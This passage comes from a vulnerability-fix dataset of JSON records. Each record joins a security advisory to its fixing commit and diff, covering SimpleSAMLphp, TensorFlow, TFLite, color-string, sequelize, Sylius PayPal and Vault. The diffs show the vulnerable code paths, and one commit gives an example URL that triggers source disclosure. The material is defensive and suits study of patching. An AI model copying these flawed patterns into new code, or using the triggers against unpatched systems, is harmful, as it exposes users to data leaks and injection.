'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/cc\/saved_model\/loader.cc'])","num_files":1.0},{"index":21,"vuln_id":"GHSA-24m3-w8g9-jwpq","cwe_id":"{'CWE-178', 'CWE-200'}","score":3.0,"chain":"{'https:\/\/github.com\/simplesamlphp\/simplesamlphp\/commit\/47968d26a2fd3ed52da70dc09210921d612ce44e'}","dataset":"osv","summary":"Information disclosure of source code in SimpleSAMLphp ### Background\n\nThe module controller in `SimpleSAML\\Module` that processes requests for pages\nhosted by modules, has code to identify paths ending with `.php` and process\nthose as PHP code. If no other suitable way of handling the given path exists it\npresents the file to the browser.\n\n### Description\n\nThe check to identify paths ending with `.php` does not account for uppercase\nletters. If someone requests a path ending with e.g. `.PHP` and the server is\nserving the code from a case-insensitive file system, such as on Windows, the\nprocessing of the PHP code does not occur, and the source code is instead\npresented to the browser.\n\n### Affected versions\n\nSimpleSAMLphp versions **1.18.5 and older**.\n\n### Impact\n\nAn attacker may use this issue to gain access to the source code in third-party\nmodules that is meant to be private, or even sensitive. However, the attack\nsurface is considered small, as the attack will only work when SimpleSAMLphp\nserves such content from a file system that is not case-sensitive, such as on\nWindows.\n\n### Resolution\n\nUpgrade the SimpleSAMLphp installation to version **1.18.6**.\n\n### Credit\n\nThis vulnerability was discovered and reported by S\u0142awek Naczy\u0144ski.","published_date":"2020-04-22","chain_len":1,"project":"https:\/\/github.com\/simplesamlphp\/simplesamlphp","commit_href":"https:\/\/github.com\/simplesamlphp\/simplesamlphp\/commit\/47968d26a2fd3ed52da70dc09210921d612ce44e","commit_sha":"47968d26a2fd3ed52da70dc09210921d612ce44e","patch":"SINGLE","chain_ord":"['47968d26a2fd3ed52da70dc09210921d612ce44e']","before_first_fix_commit":"{'228e4f2287fd5d73727178b87de7a9652bf1c5b0'}","last_fix_commit":"47968d26a2fd3ed52da70dc09210921d612ce44e","chain_ord_pos":1.0,"commit_datetime":"04\/16\/2020, 12:17:24","message":"Fix source code disclosure on case-insensitive file systems\n\nIf the file system containing the PHP code is case-insensitive, a\nrequest containing an uppercase file extension will return the\ncontents of the PHP file to the browser instead of executing it.\n\nE.g. a request for this URL will return the source code:\n\n  https:\/sp.example.org\/simplesaml\/module.php\/core\/frontpage_welcome.PHP\n\nFix that by converting the path to lowercase before checking the file\nextension.\n\nSee the following page for details:\n\n  https:\/\/github.com\/simplesamlphp\/simplesamlphp\/security\/advisories\/GHSA-24m3-w8g9-jwpq","author":"Olav Morken","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'lib\/SimpleSAML\/Module.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/simplesamlphp\/simplesamlphp\/raw\/47968d26a2fd3ed52da70dc09210921d612ce44e\/lib%2FSimpleSAML%2FModule.php', 'patch': \"@@ -259,7 +259,7 @@ function ($val) {\\n             throw new Error\\\\NotFound('The URL wasn\\\\'t found in the module.');\\n         }\\n \\n-        if (substr($path, -4) === '.php') {\\n+        if (mb_strtolower(substr($path, -4), 'UTF-8') === '.php') {\\n             \/\/ PHP file - attempt to run it\\n \\n             \/* In some environments, $_SERVER['SCRIPT_NAME'] is already set with $_SERVER['PATH_INFO']. Check for that\"}}","message_norm":"fix source code disclosure on case-insensitive file systems\n\nif the file system containing the php code is case-insensitive, a\nrequest containing an uppercase file extension will return the\ncontents of the php file to the browser instead of executing it.\n\ne.g. a request for this url will return the source code:\n\n  https:\/sp.example.org\/simplesaml\/module.php\/core\/frontpage_welcome.php\n\nfix that by converting the path to lowercase before checking the file\nextension.\n\nsee the following page for details:\n\n  https:\/\/github.com\/simplesamlphp\/simplesamlphp\/security\/advisories\/ghsa-24m3-w8g9-jwpq","language":"en","entities":"[('fix', 'ACTION', ''), ('disclosure', 'SECWORD', ''), ('https:\/sp.example.org', 'URL', ''), ('https:\/\/github.com\/simplesamlphp\/simplesamlphp\/security\/advisories\/ghsa-24m3-w8g9-jwpq', 'URL', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/SimpleSAML\/Module.php'])","num_files":1.0},{"index":24,"vuln_id":"GHSA-24x4-6qmh-88qg","cwe_id":"{'CWE-416'}","score":7.6,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e746adbfcfee15e9cfdb391ff746c765b99bdf9b'}","dataset":"osv","summary":"Use after free in `DecodePng` kernel ### Impact\nA malicious user can cause a use after free behavior when [decoding PNG images](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a1320ec1eac186da1d03f033109191f715b2b130\/tensorflow\/core\/kernels\/image\/decode_image_op.cc#L339-L346):\n```cc\nif (\/* ... error conditions ... *\/) {\n  png::CommonFreeDecode(&decode);\n  OP_REQUIRES(context, false,\n              errors::InvalidArgument(\"PNG size too large for int: \",\n                                      decode.width, \" by \", decode.height));\n}   \n```\nAfter `png::CommonFreeDecode(&decode)` gets called, the values of `decode.width` and `decode.height` are in an unspecified state.\n\n### Patches\nWe have patched the issue in GitHub commit [e746adbfcfee15e9cfdb391ff746c765b99bdf9b](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e746adbfcfee15e9cfdb391ff746c765b99bdf9b).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/e746adbfcfee15e9cfdb391ff746c765b99bdf9b","commit_sha":"e746adbfcfee15e9cfdb391ff746c765b99bdf9b","patch":"SINGLE","chain_ord":"['e746adbfcfee15e9cfdb391ff746c765b99bdf9b']","before_first_fix_commit":"{'3098fd96f45207b030c48ac78922d6221a4c421a'}","last_fix_commit":"e746adbfcfee15e9cfdb391ff746c765b99bdf9b","chain_ord_pos":1.0,"commit_datetime":"11\/12\/2021, 03:12:19","message":"Prevent use after free in `DecodePng` kernel.\n\nWe are cleaning up the memory in `decode` and then we are using an `OP_REQUIRES` to check an invariant on the `decode` data.\n\nPiperOrigin-RevId: 409299145\nChange-Id: I4eb93aaca52483eb202e89b78df07fbb2f6cb254","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 0, 'deletions': 1, 'total': 1}","files":"{'tensorflow\/core\/kernels\/image\/decode_image_op.cc': {'additions': 0, 'deletions': 1, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/e746adbfcfee15e9cfdb391ff746c765b99bdf9b\/tensorflow%2Fcore%2Fkernels%2Fimage%2Fdecode_image_op.cc', 'patch': '@@ -339,7 +339,6 @@ class DecodeImageV2Op : public OpKernel {\\n     if (width != static_cast<int64_t>(decode.width) || width <= 0 ||\\n         width >= (1LL << 27) || height != static_cast<int64_t>(decode.height) ||\\n         height <= 0 || height >= (1LL << 27) || total_size >= (1LL << 29)) {\\n-      png::CommonFreeDecode(&decode);\\n       OP_REQUIRES(context, false,\\n                   errors::InvalidArgument(\"PNG size too large for int: \",\\n                                           decode.width, \" by \", decode.height));'}}","message_norm":"prevent use after free in `decodepng` kernel.\n\nwe are cleaning up the memory in `decode` and then we are using an `op_requires` to check an invariant on the `decode` data.\n\npiperorigin-revid: 409299145\nchange-id: i4eb93aaca52483eb202e89b78df07fbb2f6cb254","language":"en","entities":"[('prevent', 'ACTION', ''), ('use after free', 'SECWORD', ''), ('decodepng', 'SECWORD', ''), ('decode', 'SECWORD', ''), ('decode', 'SECWORD', ''), ('409299145', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/image\/decode_image_op.cc'])","num_files":1.0},{"index":25,"vuln_id":"GHSA-24x6-8c7m-hv3f","cwe_id":"{'CWE-125'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/953f28dca13c92839ba389c055587cfe6c723578'}","dataset":"osv","summary":"Heap OOB read in TFLite's implementation of `Minimum` or `Maximum` ### Impact\nThe implementations of the `Minimum` and `Maximum` TFLite operators can be used to read data outside of bounds of heap allocated objects, if any of the two input tensor arguments are empty.\n\nThis is because [the broadcasting implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/0d45ea1ca641b21b73bcf9c00e0179cda284e7e7\/tensorflow\/lite\/kernels\/internal\/reference\/maximum_minimum.h#L52-L56) indexes in both tensors with the same index but does not validate that the index is within bounds:\n\n```cc\nauto maxmin_func = [&](int indexes[N]) {\n  output_data[SubscriptToIndex(output_desc, indexes)] =\n    op(input1_data[SubscriptToIndex(desc1, indexes)],\n        input2_data[SubscriptToIndex(desc2, indexes)]);\n};\n```\n\n### Patches\nWe have patched the issue in GitHub commit [953f28dca13c92839ba389c055587cfe6c723578](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/953f28dca13c92839ba389c055587cfe6c723578).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/953f28dca13c92839ba389c055587cfe6c723578","commit_sha":"953f28dca13c92839ba389c055587cfe6c723578","patch":"SINGLE","chain_ord":"['953f28dca13c92839ba389c055587cfe6c723578']","before_first_fix_commit":"{'801c1c6be5324219689c98e1bd3e0ca365ee834d'}","last_fix_commit":"953f28dca13c92839ba389c055587cfe6c723578","chain_ord_pos":1.0,"commit_datetime":"04\/28\/2021, 00:46:38","message":"Prevent a null pointer exception in TFLite\n\nPiperOrigin-RevId: 370800206\nChange-Id: Idd437ebce4ff224120d8eefc1c14c062173b71d6","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 31, 'deletions': 29, 'total': 60}","files":"{'tensorflow\/lite\/kernels\/maximum_minimum.cc': {'additions': 31, 'deletions': 29, 'changes': 60, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/953f28dca13c92839ba389c055587cfe6c723578\/tensorflow%2Flite%2Fkernels%2Fmaximum_minimum.cc', 'patch': '@@ -157,35 +157,37 @@ template <KernelType kernel_type, typename OpType>\\n TfLiteStatus Eval(TfLiteContext* context, TfLiteNode* node) {\\n   OpContext op_context(context, node);\\n \\n-    switch (op_context.output->type) {\\n-      case kTfLiteFloat32:\\n-        TFLiteOperation<kernel_type, float, OpType>(context, node, op_context);\\n-        break;\\n-      case kTfLiteUInt8:\\n-        TFLiteOperation<kernel_type, uint8_t, OpType>(context, node,\\n-                                                      op_context);\\n-        break;\\n-      case kTfLiteInt8:\\n-        TFLiteOperation<kernel_type, int8_t, OpType>(context, node, op_context);\\n-        break;\\n-      case kTfLiteInt32:\\n-        TFLiteOperation<kernel_type, int32_t, OpType>(context, node,\\n-                                                      op_context);\\n-        break;\\n-      case kTfLiteInt64:\\n-        TFLiteOperation<kernel_type, int64_t, OpType>(context, node,\\n-                                                      op_context);\\n-        break;\\n-      case kTfLiteInt16:\\n-        TFLiteOperation<kernel_type, int16_t, OpType>(context, node,\\n-                                                      op_context);\\n-        break;\\n-      default:\\n-        context->ReportError(context,\\n-                             \"Type %d is currently not supported by Maximum.\",\\n-                             op_context.output->type);\\n-        return kTfLiteError;\\n-    }\\n+  \/\/ If inputs have no element, shortcircuit.\\n+  if (NumElements(op_context.input1) == 0 ||\\n+      NumElements(op_context.input2) == 0) {\\n+    return kTfLiteOk;\\n+  }\\n+\\n+  switch (op_context.output->type) {\\n+    case kTfLiteFloat32:\\n+      TFLiteOperation<kernel_type, float, OpType>(context, node, op_context);\\n+      break;\\n+    case kTfLiteUInt8:\\n+      TFLiteOperation<kernel_type, uint8_t, OpType>(context, node, op_context);\\n+      break;\\n+    case kTfLiteInt8:\\n+      TFLiteOperation<kernel_type, int8_t, OpType>(context, node, op_context);\\n+      break;\\n+    case kTfLiteInt32:\\n+      TFLiteOperation<kernel_type, int32_t, OpType>(context, node, op_context);\\n+      break;\\n+    case kTfLiteInt64:\\n+      TFLiteOperation<kernel_type, int64_t, OpType>(context, node, op_context);\\n+      break;\\n+    case kTfLiteInt16:\\n+      TFLiteOperation<kernel_type, int16_t, OpType>(context, node, op_context);\\n+      break;\\n+    default:\\n+      context->ReportError(context,\\n+                           \"Type %d is currently not supported by Maximum.\",\\n+                           op_context.output->type);\\n+      return kTfLiteError;\\n+  }\\n   return kTfLiteOk;\\n }'}}","message_norm":"prevent a null pointer exception in tflite\n\npiperorigin-revid: 370800206\nchange-id: idd437ebce4ff224120d8eefc1c14c062173b71d6","language":"en","entities":"[('prevent', 'ACTION', ''), ('null pointer exception', 'SECWORD', ''), ('370800206', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/maximum_minimum.cc'])","num_files":1.0},{"index":29,"vuln_id":"GHSA-257v-vj4p-3w2h","cwe_id":"{'CWE-770'}","score":5.3,"chain":"{'https:\/\/github.com\/Qix-\/color-string\/commit\/0789e21284c33d89ebc4ab4ca6f759b9375ac9d3'}","dataset":"osv","summary":"Regular Expression Denial of Service (ReDOS) In the npm package `color-string`, there is a  ReDos (Regular Expression Denial of Service) vulnerability regarding an exponential time complexity for\nlinearly increasing input lengths for `hwb()` color strings.\n\nStrings reaching more than 5000 characters would see several\nmilliseconds of processing time; strings reaching more than\n50,000 characters began seeing 1500ms (1.5s) of processing time.\n\nThe cause was due to a the regular expression that parses\nhwb() strings - specifically, the hue value - where\nthe integer portion of the hue value used a 0-or-more quantifier\nshortly thereafter followed by a 1-or-more quantifier.\n\nThis caused excessive backtracking and a cartesian scan,\nresulting in exponential time complexity given a linear\nincrease in input length.","published_date":"2021-06-22","chain_len":1,"project":"https:\/\/github.com\/Qix-\/color-string","commit_href":"https:\/\/github.com\/Qix-\/color-string\/commit\/0789e21284c33d89ebc4ab4ca6f759b9375ac9d3","commit_sha":"0789e21284c33d89ebc4ab4ca6f759b9375ac9d3","patch":"SINGLE","chain_ord":"['0789e21284c33d89ebc4ab4ca6f759b9375ac9d3']","before_first_fix_commit":"{'60f3f66477a298589288e3df6e895f88e6cd8e8e'}","last_fix_commit":"0789e21284c33d89ebc4ab4ca6f759b9375ac9d3","chain_ord_pos":1.0,"commit_datetime":"03\/05\/2021, 17:48:41","message":"fix ReDos in hwb() parser (low-severity)\n\nDiscovered by Yeting Li, c\/o Colin Ife via Snyk.io.\n\nA ReDos (Regular Expression Denial of Service) vulnerability\nwas responsibly disclosed to me via email by Colin on\nMar 5 2021 regarding an exponential time complexity for\nlinearly increasing input lengths for `hwb()` color strings.\n\nStrings reaching more than 5000 characters would see several\nmilliseconds of processing time; strings reaching more than\n50,000 characters began seeing 1500ms (1.5s) of processing time.\n\nThe cause was due to a the regular expression that parses\nhwb() strings - specifically, the hue value - where\nthe integer portion of the hue value used a 0-or-more quantifier\nshortly thereafter followed by a 1-or-more quantifier.\n\nThis caused excessive backtracking and a cartesian scan,\nresulting in exponential time complexity given a linear\nincrease in input length.\n\nThank you Yeting Li and Colin Ife for bringing this to my\nattention in a secure, responsible and professional manner.\n\nA CVE will not be assigned for this vulnerability.","author":"Josh Junon","comments":null,"stats":"{'additions': 2, 'deletions': 2, 'total': 4}","files":"{'index.js': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Qix-\/color-string\/raw\/0789e21284c33d89ebc4ab4ca6f759b9375ac9d3\/index.js', 'patch': '@@ -129,7 +129,7 @@ cs.get.hsl = function (string) {\\n \\t\\treturn null;\\n \\t}\\n \\n-\\tvar hsl = \/^hsla?\\\\(\\\\s*([+-]?(?:\\\\d*\\\\.)?\\\\d+)(?:deg)?\\\\s*,\\\\s*([+-]?[\\\\d\\\\.]+)%\\\\s*,\\\\s*([+-]?[\\\\d\\\\.]+)%\\\\s*(?:,\\\\s*([+-]?[\\\\d\\\\.]+)\\\\s*)?\\\\)$\/;\\n+\\tvar hsl = \/^hsla?\\\\(\\\\s*([+-]?(?:\\\\d{0,3}\\\\.)?\\\\d+)(?:deg)?\\\\s*,\\\\s*([+-]?[\\\\d\\\\.]+)%\\\\s*,\\\\s*([+-]?[\\\\d\\\\.]+)%\\\\s*(?:,\\\\s*([+-]?[\\\\d\\\\.]+)\\\\s*)?\\\\)$\/;\\n \\tvar match = string.match(hsl);\\n \\n \\tif (match) {\\n@@ -150,7 +150,7 @@ cs.get.hwb = function (string) {\\n \\t\\treturn null;\\n \\t}\\n \\n-\\tvar hwb = \/^hwb\\\\(\\\\s*([+-]?\\\\d*[\\\\.]?\\\\d+)(?:deg)?\\\\s*,\\\\s*([+-]?[\\\\d\\\\.]+)%\\\\s*,\\\\s*([+-]?[\\\\d\\\\.]+)%\\\\s*(?:,\\\\s*([+-]?[\\\\d\\\\.]+)\\\\s*)?\\\\)$\/;\\n+\\tvar hwb = \/^hwb\\\\(\\\\s*([+-]?\\\\d{0,3}(?:\\\\.\\\\d+)?)(?:deg)?\\\\s*,\\\\s*([+-]?[\\\\d\\\\.]+)%\\\\s*,\\\\s*([+-]?[\\\\d\\\\.]+)%\\\\s*(?:,\\\\s*([+-]?[\\\\d\\\\.]+)\\\\s*)?\\\\)$\/;\\n \\tvar match = string.match(hwb);\\n \\n \\tif (match) {'}}","message_norm":"fix redos in hwb() parser (low-severity)\n\ndiscovered by yeting li, c\/o colin ife via snyk.io.\n\na redos (regular expression denial of service) vulnerability\nwas responsibly disclosed to me via email by colin on\nmar 5 2021 regarding an exponential time complexity for\nlinearly increasing input lengths for `hwb()` color strings.\n\nstrings reaching more than 5000 characters would see several\nmilliseconds of processing time; strings reaching more than\n50,000 characters began seeing 1500ms (1.5s) of processing time.\n\nthe cause was due to a the regular expression that parses\nhwb() strings - specifically, the hue value - where\nthe integer portion of the hue value used a 0-or-more quantifier\nshortly thereafter followed by a 1-or-more quantifier.\n\nthis caused excessive backtracking and a cartesian scan,\nresulting in exponential time complexity given a linear\nincrease in input length.\n\nthank you yeting li and colin ife for bringing this to my\nattention in a secure, responsible and professional manner.\n\na cve will not be assigned for this vulnerability.","language":"en","entities":"[('fix', 'ACTION', ''), ('redos', 'SECWORD', ''), ('low', 'SEVERITY', ''), ('redos', 'SECWORD', ''), ('denial of service', 'SECWORD', ''), ('vulnerability', 'SECWORD', ''), ('secure', 'SECWORD', ''), ('cve', 'SECWORD', ''), ('vulnerability', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['index.js'])","num_files":1.0},{"index":30,"vuln_id":"GHSA-2598-2f59-rmhq","cwe_id":"{'CWE-89'}","score":9.8,"chain":"{'https:\/\/github.com\/sequelize\/sequelize\/commit\/ee4017379db0059566ecb5424274ad4e2d66bc68'}","dataset":"osv","summary":"SQL Injection in sequelize Versions of `sequelize` prior to 3.35.1 are vulnerable to SQL Injection. The package fails to sanitize JSON path keys in the Postgres dialect,  which may allow attackers to inject SQL statements and execute arbitrary SQL queries.\n\n\n## Recommendation\n\nUpgrade to version 3.35.1 or later.","published_date":"2019-11-08","chain_len":1,"project":"https:\/\/github.com\/sequelize\/sequelize","commit_href":"https:\/\/github.com\/sequelize\/sequelize\/commit\/ee4017379db0059566ecb5424274ad4e2d66bc68","commit_sha":"ee4017379db0059566ecb5424274ad4e2d66bc68","patch":"SINGLE","chain_ord":"['ee4017379db0059566ecb5424274ad4e2d66bc68']","before_first_fix_commit":"{'75c1fdbc676d73a28a5e0bca49b2a6d4a9f8708c'}","last_fix_commit":"ee4017379db0059566ecb5424274ad4e2d66bc68","chain_ord_pos":1.0,"commit_datetime":"06\/20\/2019, 05:26:22","message":"fix(postgres): json path key quoting (#11088)","author":"Sushant","comments":null,"stats":"{'additions': 2, 'deletions': 1, 'total': 3}","files":"{'lib\/dialects\/abstract\/query-generator.js': {'additions': 2, 'deletions': 1, 'changes': 3, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/sequelize\/sequelize\/raw\/ee4017379db0059566ecb5424274ad4e2d66bc68\/lib%2Fdialects%2Fabstract%2Fquery-generator.js', 'patch': \"@@ -2198,7 +2198,8 @@ var QueryGenerator = {\\n             path[path.length - 1] = $tmp[0];\\n           }\\n \\n-          $baseKey = self.quoteIdentifier(key)+'#>>\\\\'{'+path.join(', ')+'}\\\\'';\\n+          var pathKey = self.escape('{' + path.join(', ') + '}');\\n+          $baseKey = self.quoteIdentifier(key)+'#>>'+pathKey;\\n \\n           if (options.prefix) {\\n             if (options.prefix instanceof Utils.literal) {\"}}","message_norm":"fix(postgres): json path key quoting (#11088)","language":"en","entities":"[('fix(postgres', 'ACTION', ''), ('key', 'SECWORD', ''), ('#11088', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/dialects\/abstract\/query-generator.js'])","num_files":1.0},{"index":32,"vuln_id":"GHSA-25fx-mxc2-76g7","cwe_id":"{'CWE-200'}","score":7.5,"chain":"{'https:\/\/github.com\/Sylius\/PayPalPlugin\/commit\/814923c2e9d97fe6279dcee866c34ced3d2fb7a7', 'https:\/\/github.com\/Sylius\/PayPalPlugin\/commit\/2adc46be2764ccee22b4247139b8056fb8d1afff'}","dataset":"osv","summary":"Unauthorized access to Credit card form exposing payer name and not requiring 3DS ### Impact\nURL to the payment page done after checkout was created with autoincremented payment id (`\/pay-with-paypal\/{id}`) and therefore it was easy to access for anyone, not even the order's customer. The problem was, the Credit card form has prefilled \"credit card holder\" field with the Customer's first and last name.\nAdditionally, the mentioned form did not require a 3D Secure authentication, as well as did not checked the result of the 3D Secure authentication.\n\n### Patches\nThe problem has been patched in Sylius\/PayPalPlugin **1.2.4** and **1.3.1**\n\n### Workarounds\nOne can override a `sylius_paypal_plugin_pay_with_paypal_form` route and change its URL parameters to (for example) `{orderToken}\/{paymentId}`, then override the `Sylius\\PayPalPlugin\\Controller\\PayWithPayPalFormAction` service, to operate on the payment taken from the repository by these 2 values. It would also require usage of custom repository method.\nAdditionally, one could override the `@SyliusPayPalPlugin\/payWithPaypal.html.twig` template, to add `contingencies: ['SCA_ALWAYS']` line in `hostedFields.submit(...)` function call (line 421). It would then have to be handled in the function callback.\n\n### For more information\nIf you have any questions or comments about this advisory:\n- Open an issue in Sylius\/PayPalPlugin issues\n- Email us at security at sylius dot com","published_date":"2021-10-06","chain_len":2,"project":"https:\/\/github.com\/Sylius\/PayPalPlugin","commit_href":"https:\/\/github.com\/Sylius\/PayPalPlugin\/commit\/2adc46be2764ccee22b4247139b8056fb8d1afff","commit_sha":"2adc46be2764ccee22b4247139b8056fb8d1afff","patch":"MULTI","chain_ord":"['2adc46be2764ccee22b4247139b8056fb8d1afff', '814923c2e9d97fe6279dcee866c34ced3d2fb7a7']","before_first_fix_commit":"{'2adc46be2764ccee22b4247139b8056fb8d1afff', 'a375013be7a740bef132927d74a1e03fd78a60ef'}","last_fix_commit":"814923c2e9d97fe6279dcee866c34ced3d2fb7a7","chain_ord_pos":1.0,"commit_datetime":"10\/04\/2021, 13:57:45","message":"Require 3D Secure and process its response correctly","author":"Mateusz Zalewski","comments":"{'com_1': {'author': 'Maseeullahz', 'datetime': '01\/29\/2022, 00:49:58', 'body': 'IKSDKN'}}","stats":"{'additions': 33, 'deletions': 13, 'total': 46}","files":"{'src\/Resources\/views\/payWithPaypal.html.twig': {'additions': 33, 'deletions': 13, 'changes': 46, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/Sylius\/PayPalPlugin\/raw\/2adc46be2764ccee22b4247139b8056fb8d1afff\/src%2FResources%2Fviews%2FpayWithPaypal.html.twig', 'patch': \"@@ -329,6 +329,8 @@\\n         });\\n \\n         if (paypal.HostedFields.isEligible() === true) {\\n+            let processingOrderId;\\n+\\n             paypal.HostedFields.render({\\n                 createOrder: function(data, actions) {\\n                     document.querySelector('#paypal-payment-container').classList.add('loading');\\n@@ -339,6 +341,8 @@\\n                     }).then(function(res) {\\n                         return res.json();\\n                     }).then(function(data) {\\n+                        processingOrderId = data.orderID;\\n+\\n                         return data.orderID;\\n                     });\\n                 },\\n@@ -419,6 +423,7 @@\\n \\n                     if (formValid) {\\n                         hostedFields.submit({\\n+                            contingencies: ['SCA_ALWAYS'],\\n                             cardholderName: document.getElementById('card-holder-name').value,\\n                             billingAddress: {\\n                                 streetAddress: document.getElementById('card-billing-address-street').value,\\n@@ -428,20 +433,35 @@\\n                                 countryCodeAlpha2: document.getElementById('card-billing-address-country').value\\n                             }\\n                         }).then(payload => {\\n-                            return fetch(completePayPalOrderUrl, {\\n-                                method: 'post'\\n-                            }).then(function(res) {\\n-                                return res.json();\\n+                            if (payload.authenticationReason == 'SUCCESSFUL' && payload.authenticationStatus == 'YES') {\\n+                                return fetch(completePayPalOrderUrl, {\\n+                                    method: 'post'\\n+                                }).then(function(res) {\\n+                                    return res.json();\\n+                                }).then(function(data) {\\n+                                    if (data.status == 'processing') {\\n+                                        return fetch(cancelPayPalPaymentUrl, {\\n+                                            method: 'post',\\n+                                            headers: { 'content-type': 'application\/json' },\\n+                                            body: JSON.stringify({ payPalOrderId: data.orderID })\\n+                                        }).then(window.location.reload());\\n+                                    }\\n+\\n+                                    window.location.href = data.return_url;\\n+                                });\\n+                            }\\n+\\n+\\n+                            return fetch(errorPayPalPaymentUrl, {\\n+                                method: 'post',\\n+                                headers: { 'content-type': 'application\/json' },\\n+                                body: JSON.stringify('Invalid 3D Secure authentication.')\\n                             }).then(function(data) {\\n-                                if (data.status == 'processing') {\\n-                                    return fetch(cancelPayPalPaymentUrl, {\\n-                                        method: 'post',\\n-                                        headers: { 'content-type': 'application\/json' },\\n-                                        body: JSON.stringify({ payPalOrderId: data.orderID })\\n-                                    }).then(window.location.reload());\\n-                                }\\n-\\n-                                window.location.href = data.return_url;\\n+                                return fetch(cancelPayPalPaymentUrl, {\\n+                                    method: 'post',\\n+                                    headers: { 'content-type': 'application\/json' },\\n+                                    body: JSON.stringify({ payPalOrderId: processingOrderId })\\n+                                }).then(window.location.reload());\\n                             });\\n                         });\\n                     } else {\"}}","message_norm":"require 3d secure and process its response correctly","language":"en","entities":"[('secure', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/Resources\/views\/payWithPaypal.html.twig'])","num_files":1.0},{"index":35,"vuln_id":"GHSA-25xj-89g5-fm6h","cwe_id":"{'CWE-532', 'CWE-200'}","score":7.5,"chain":"{'https:\/\/github.com\/hashicorp\/vault\/commit\/87f47c216cf1a28f4054b80cff40de8c9e00e36c', 'https:\/\/github.com\/hashicorp\/vault\/commit\/e52f34772affb69f3239b2cdf6523cb7cfd67a92'}","dataset":"osv","summary":"Information Disclosure in HashiCorp Vault HashiCorp Vault and Vault Enterprise before 1.3.6, and 1.4.2 before 1.4.2, insert Sensitive Information into a Log File.","published_date":"2021-05-18","chain_len":2,"project":"https:\/\/github.com\/hashicorp\/vault","commit_href":"https:\/\/github.com\/hashicorp\/vault\/commit\/87f47c216cf1a28f4054b80cff40de8c9e00e36c","commit_sha":"87f47c216cf1a28f4054b80cff40de8c9e00e36c","patch":"MULTI","chain_ord":"['e52f34772affb69f3239b2cdf6523cb7cfd67a92', '87f47c216cf1a28f4054b80cff40de8c9e00e36c']","before_first_fix_commit":"{'01a682aa48ede581e12813314e64a75e314e500e'}","last_fix_commit":"87f47c216cf1a28f4054b80cff40de8c9e00e36c","chain_ord_pos":2.0,"commit_datetime":"05\/21\/2020, 21:21:48","message":"changelog++\n\nUpdated with CVE numbers for 1.4.2 and 1.3.6.","author":"Meggie","comments":null,"stats":"{'additions': 3, 'deletions': 2, 'total': 5}","files":"{'CHANGELOG.md': {'additions': 3, 'deletions': 2, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/hashicorp\/vault\/raw\/87f47c216cf1a28f4054b80cff40de8c9e00e36c\/CHANGELOG.md', 'patch': '@@ -29,7 +29,8 @@ BUG FIXES:\\n ## 1.4.2 (May 21st, 2020)\\n \\n SECURITY:\\n-* core: proxy environment variables are now redacted before being logged, in case the URLs include a username:password [[GH-9022](https:\/\/github.com\/hashicorp\/vault\/pull\/9022)]\\n+* core: proxy environment variables are now redacted before being logged, in case the URLs include a username:password. This vulnerability, CVE-2020-13223, is fixed in 1.3.6 and 1.4.2, but affects 1.4 and 1.4.2, as well as older versions of Vault [[GH-9022](https:\/\/github.com\/hashicorp\/vault\/pull\/9022)]\\n+* secrets\/gcp: Fix a regression in 1.4.0 where the system TTLs were being used instead of the configured backend TTLs for dynamic service accounts. This vulnerability is CVE-2020-12757. [[GH-85](https:\/\/github.com\/hashicorp\/vault-plugin-secrets-gcp\/pull\/85)]\\n \\n IMPROVEMENTS:\\n \\n@@ -216,7 +217,7 @@ BUG FIXES:\\n ## 1.3.6 (May 21st, 2020)\\n \\n SECURITY:\\n-* core: proxy environment variables are now redacted before being logged, in case the URLs include a username:password [[GH-9022](https:\/\/github.com\/hashicorp\/vault\/pull\/9022)]\\n+* core: proxy environment variables are now redacted before being logged, in case the URLs include a username:password. This vulnerability, CVE-2020-13223, is fixed in 1.3.6 and 1.4.2, but 